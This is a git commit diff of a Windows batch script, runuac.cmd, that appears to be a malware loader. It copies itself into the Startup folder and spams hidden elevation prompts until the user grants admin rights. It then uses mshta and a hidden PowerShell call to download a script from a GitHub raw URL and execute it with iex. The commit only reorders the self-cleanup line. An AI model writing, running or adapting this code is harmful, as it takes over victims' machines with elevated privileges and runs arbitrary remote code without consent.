c9b8785af40cab7ea8a77195dc4c54ca9de6c1e5
43a1723 <hai1723notgay@gmail.com>
2024-06-07 10:39:59 +0700

    Update runuac.cmd

--- runuac.cmd
+++ runuac.cmd
@@ -4,5 +4,5 @@ cd /d "%~dp0"
 copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
 net session >nul 2>&1
 if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
 mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t",0))
+del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
